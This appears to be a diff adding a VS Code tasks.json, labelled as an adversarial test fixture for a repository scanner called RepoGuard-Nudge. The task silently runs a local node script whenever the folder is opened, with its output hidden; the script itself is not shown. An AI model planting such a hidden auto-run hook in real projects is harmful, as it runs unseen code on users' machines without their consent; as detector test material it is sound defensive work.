@@ -1,0 +1,15 @@
+{
+  // "Configuração do ambiente do desafio" (fixture adversarial do RepoGuard-Nudge).
+  // Roda sozinha ao abrir a pasta, depois que o usuário confia no workspace.
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Preparar ambiente do desafio",
+      "type": "shell",
+      "command": "node",
+      "args": [".vscode/preparar.js"],
+      "presentation": { "reveal": "never", "echo": false },
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
